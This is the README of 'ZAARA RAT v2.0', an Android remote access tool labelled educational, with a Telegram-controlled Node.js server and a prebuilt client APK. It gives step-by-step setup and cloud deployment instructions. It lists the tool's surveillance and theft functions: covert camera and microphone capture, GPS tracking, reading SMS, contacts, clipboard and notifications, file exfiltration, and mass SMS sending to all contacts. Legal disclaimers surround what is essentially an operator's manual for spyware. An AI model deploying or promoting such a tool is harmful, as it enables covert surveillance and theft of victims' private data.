# ZAARA RAT v2.0

### Advanced Android Remote Administration Tool

**For Educational & Research Purposes Only**

**Author:** ZAARA | **Version:** 2.0.0 | **License:** MIT (Educational Use)

---

## About ZAARA RAT

ZAARA RAT is an advanced Android Remote Administration Tool designed for cybersecurity education and research. This tool demonstrates the capabilities and risks of remote access tools, helping students and researchers understand mobile security threats.

### Architecture

- **Server Side:** Node.js, Express.js, Socket.IO
- **Client Side:** Android APK (Kotlin-based)
- **Communication:** Telegram Bot API for command & control
- **Real-time:** WebSocket-based bidirectional communication

---

## Features

### Core Functionality
- Real-time device monitoring and control
- Telegram bot interface for command execution
- Session management with unique device IDs
- Rate limiting and security controls
- Comprehensive logging system

### Device Information
- Device model, manufacturer, and Android version
- Battery status and level monitoring
- Network information (IP, carrier, connection type)
- Installed applications list
- Contact list access

### Remote Actions
- **Camera Control:** Capture photos from front/rear cameras
- **Microphone:** Record audio with custom duration
- **Location Tracking:** Get GPS coordinates
- **SMS Operations:** Read messages, send SMS to contacts
- **Notifications:** Read notifications, send custom notifications
- **Toast Messages:** Display messages on target device
- **Vibration Control:** Trigger device vibration
- **File Management:** Upload/download files
- **Clipboard Access:** Retrieve clipboard content
- **Custom Webview:** Open URLs on target device

### Security Features
- Session-based authentication
- Rate limiting protection
- Request validation
- Secure file uploads
- Activity logging
- Auto-cleanup mechanisms

---

## Installation

### Prerequisites
- Node.js v14 or higher
- npm v6 or higher
- Telegram Bot Token (from @BotFather)
- Your Telegram Chat ID

### Setup Steps

1. **Clone the repository**
```bash
git clone https://github.com/zaaraZiof0/ZAARA-RAT-v2.0.git
cd ZAARA-RAT-v2.0
```

2. **Install dependencies**
```bash
npm install
```

3. **Configure settings**
```bash
cp data.json.example data.json
```

Edit `data.json` with your credentials:
```json
{
    "token": "YOUR_TELEGRAM_BOT_TOKEN",
    "id": "YOUR_TELEGRAM_CHAT_ID",
    "host": "http://localhost:3000/"
}
```

4. **Start the server**
```bash
npm start
```

The server will run on `http://localhost:3000`

---

## Configuration

### data.json
- `token`: Your Telegram Bot token from @BotFather
- `id`: Your Telegram Chat ID (get from @userinfobot)
- `host`: Your server URL (use trailing slash)

### Environment Variables (Optional)
Create a `.env` file for additional configuration:
```
PORT=3000
NODE_ENV=production
MAX_UPLOAD_SIZE=52428800
```

---

## Usage

### Starting the Server
```bash
npm start
```

### Development Mode
```bash
npm run dev
```

### Bot Commands

Once a device connects, use these Telegram bot commands:

- **Device Info:** Get complete device information
- **Camera:** Capture front or rear camera
- **Location:** Get current GPS coordinates
- **Messages:** View all SMS messages
- **Contacts:** Retrieve contact list
- **Apps:** List installed applications
- **Record Audio:** Capture microphone with custom duration
- **Send SMS:** Send SMS to any number or all contacts
- **Clipboard:** Get current clipboard content
- **Notifications:** View recent notifications
- **Custom Actions:** Vibrate, toast messages, custom webview

---

## API Endpoints

### Device Connection
- `POST /` - Client connection endpoint
- WebSocket connection for real-time communication

### File Operations
- `POST /upload` - File upload from device
- `POST /download` - File download to server

### Data Endpoints
- Device sends data via Socket.IO events
- Server processes and forwards to Telegram

---

## Project Structure

```
ZAARA-RAT-v2.0/
├── server.js              # Main server application
├── package.json           # Dependencies and scripts
├── data.json             # Configuration (gitignored)
├── data.json.example     # Configuration template
├── .env.example          # Environment template
├── .gitignore            # Git ignore rules
├── LICENSE               # MIT License
└── client apps/
    └── CLIENT.apk        # Android client application
```

---

## Security Considerations

### Important Notes
- This tool is for EDUCATIONAL purposes only
- Always obtain proper authorization before use
- Never use on devices without explicit permission
- Understand local laws regarding remote monitoring
- Use only in controlled environments

### Built-in Security
- Rate limiting prevents abuse
- Session management tracks connections
- Logging records all activities
- Input validation prevents injection
- Secure file handling
- Git ignores sensitive configuration

### Recommendations
- Use strong, unique bot tokens
- Restrict bot access to authorized users only
- Run server in secure, private networks
- Monitor logs regularly
- Keep dependencies updated
- Use HTTPS in production

---

## Deployment

### Local Development
```bash
npm start
```

### Production Deployment

**Option 1: Render.com**
1. Create account on Render.com
2. Create new Web Service
3. Connect GitHub repository
4. Add environment variables
5. Deploy

**Option 2: Heroku**
```bash
heroku create zaara-rat
heroku config:set TELEGRAM_BOT_TOKEN=your_token
git push heroku main
```

**Option 3: VPS (Ubuntu)**
```bash
# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs

# Clone and setup
git clone https://github.com/zaaraZiof0/ZAARA-RAT-v2.0.git
cd ZAARA-RAT-v2.0
npm install

# Use PM2 for process management
npm install -g pm2
pm2 start server.js --name zaara-rat
pm2 startup
pm2 save
```

---

## Troubleshooting

### Common Issues

**Bot not responding**
- Check bot token in data.json
- Verify chat ID is correct
- Ensure bot is started with /start command

**Device not connecting**
- Verify server URL in APK configuration
- Check network connectivity
- Review server logs for errors

**File upload fails**
- Check upload size limits
- Verify upload directory permissions
- Review multer configuration

**WebSocket connection fails**
- Check firewall settings
- Verify Socket.IO configuration
- Test with simple Socket.IO client

---

## Technical Details

### Technologies Used
- **Node.js** - Runtime environment
- **Express.js** - Web framework
- **Socket.IO** - Real-time bidirectional communication
- **node-telegram-bot-api** - Telegram bot integration
- **Multer** - File upload handling
- **UUID** - Unique identifier generation

### Performance
- Handles multiple concurrent device connections
- Efficient WebSocket communication
- Minimal resource usage
- Fast response times

### Compatibility
- Node.js 14+
- Android 5.0 (Lollipop) and higher
- Modern web browsers for admin panel

---

## Contributing

This is an educational project. Contributions that enhance learning value are welcome:

1. Fork the repository
2. Create feature branch (`git checkout -b feature/improvement`)
3. Commit changes (`git commit -am 'Add improvement'`)
4. Push to branch (`git push origin feature/improvement`)
5. Create Pull Request

---

## License

This project is licensed under the MIT License for **Educational Use Only**.

See [LICENSE](LICENSE) file for full details.

### License Summary
- Free to use for educational purposes
- Attribution required (credit to ZAARA)
- No warranty provided
- Author not liable for misuse
- Must comply with local laws

---

## Legal Disclaimer

**IMPORTANT:** This software is provided for **educational and research purposes ONLY**.

### Terms of Use
- This tool demonstrates security vulnerabilities for learning
- Unauthorized access to devices is ILLEGAL
- Users must obtain explicit permission before use
- Creator assumes NO responsibility for misuse
- Violation of laws may result in criminal prosecution

### Ethical Guidelines
- Only use in authorized, controlled environments
- Respect privacy and legal boundaries
- Use for educational advancement, not malicious intent
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

By using this software, you agree to use it responsibly and legally.

---

## Author

**ZAARA**

Cybersecurity Researcher & Developer

### Project Information
- **Project:** ZAARA RAT v2.0
- **Purpose:** Cybersecurity Education
- **Year:** 2024
- **Repository:** https://github.com/zaaraZiof0/ZAARA-RAT-v2.0

---

## Acknowledgments

- Telegram Bot API for communication infrastructure
- Socket.IO for real-time capabilities
- Node.js community for excellent libraries
- Cybersecurity research community for inspiration

---

## Version History

### v2.0.0 (Current)
- Complete rewrite with clean, documented code
- Advanced session management
- Enhanced security features
- Comprehensive logging system
- Rate limiting protection
- Improved error handling
- Professional documentation
- Educational focus

### v1.0.0
- Initial release
- Basic RAT functionality
- Telegram bot integration

---

## Support

For educational purposes and legitimate research only.

### Resources
- Documentation: See project files
- Issues: GitHub Issues page
- Security: Report responsibly

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally.**

---

*Built for cybersecurity education by ZAARA*
